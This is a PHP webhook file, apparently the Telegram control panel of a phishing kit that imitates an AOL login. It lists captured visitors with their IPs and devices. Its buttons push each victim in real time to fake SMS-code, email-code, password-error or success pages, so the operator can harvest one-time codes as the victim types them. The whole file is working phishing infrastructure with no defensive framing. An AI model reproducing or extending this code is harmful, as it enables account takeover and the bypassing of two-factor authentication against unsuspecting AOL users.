<?php
// webhook.php — AOL Telegram webhook
// FIX: 200 OK sent to Telegram IMMEDIATELY, all processing runs after connection closes

require 'config.php';

$raw    = file_get_contents('php://input');
$update = json_decode($raw, true);

// ════════════════════════════════════════════════
//  SEND 200 OK TO TELEGRAM INSTANTLY — DO NOT MOVE
// ════════════════════════════════════════════════
http_response_code(200);
header('Content-Type: text/plain');
if (ob_get_level()) ob_end_clean();
ob_start();
echo 'ok';
header('Content-Length: ' . ob_get_length());
header('Connection: close');
ob_end_flush();
flush();

if (function_exists('fastcgi_finish_request')) {
    fastcgi_finish_request();
}

// ════════════════════════════════════════════════
//  ALL PROCESSING RUNS AFTER TELEGRAM IS FREED
// ════════════════════════════════════════════════

if (!$update) exit;

/* ══ /commands ══ */
if (isset($update['message']['text'])) {
    $txt = trim($update['message']['text']);

    if (in_array($txt, ['/start', '/menu'])) {
        tg_send(
            "👋 <b>AOL — Admin Panel</b>\n\n" .
            "Visitors appear automatically when they load the page.\n\n" .
            "/status — list active visitors\n" .
            "/clear — delete all sessions"
        );
    }
    if ($txt === '/status') {
        $files = glob(SESSIONS_DIR . '/v_*.json');
        if (!$files) {
            tg_send("📭 No active visitors.");
        } else {
            $msg = "👥 <b>Active Visitors (" . count($files) . ")</b>\n\n";
            foreach ($files as $f) {
                $v = json_decode(file_get_contents($f), true);
                if (!$v) continue;
                $msg .= "🆔 <code>{$v['sid']}</code>\n";
                $msg .= "📍 Page: <b>{$v['page']}</b> | IP: <code>{$v['ip']}</code>\n";
                $msg .= "💻 {$v['device_os']} | {$v['device_browser']}\n";
                $msg .= "⏰ {$v['created']}\n\n";
            }
            tg_send($msg);
        }
    }
    if ($txt === '/clear') {
        foreach (glob(SESSIONS_DIR . '/v_*.json') ?: [] as $f) unlink($f);
        tg_send("🗑️ All AOL sessions cleared.");
    }
    exit;
}

/* ══ Inline button presses ══ */
if (!isset($update['callback_query'])) exit;

$cb     = $update['callback_query'];
$cqid   = $cb['id'];
$data   = $cb['data'] ?? '';
$parts  = explode('|', $data);
$action = $parts[0] ?? '';
$sid    = $parts[1] ?? '';

// Dismiss spinner — after 200 already sent
tg_answer($cqid, '');

if (!$sid) exit;

switch ($action) {

    case 'sms':
        set_state($sid, ['page' => 'sms_verify']);
        tg_send("📱 <b>SMS Verify page shown</b>\n🆔 <code>{$sid}</code>\nWaiting for visitor to enter code...");
        break;

    case 'evc':
        set_state($sid, ['page' => 'email_verify']);
        tg_send("📧 <b>Email Verify page shown</b>\n🆔 <code>{$sid}</code>\nWaiting for visitor to enter code...");
        break;

    case 'pwe':
        set_state($sid, ['page' => 'pw_error']);
        tg_send("❌ <b>Password error shown</b>\n🆔 <code>{$sid}</code>\nWaiting for visitor to retry...");
        break;

    case 'ld':
        set_state($sid, ['page' => 'loading']);
        break;

    case 'ce':
        set_state($sid, ['page' => 'code_error']);
        break;

    case 'ok':
        set_state($sid, ['page' => 'success']);
        tg_send("💛 <b>SUCCESS</b>\n🆔 <code>{$sid}</code>\n✅ Visitor sent to " . SUCCESS_URL);
        break;

    case 'blk':
        set_state($sid, ['page' => 'blocked', 'blocked' => true]);
        tg_send("🅱️ <b>Visitor blocked</b>\n🆔 <code>{$sid}</code>");
        break;

    default:
        break;
}

exit;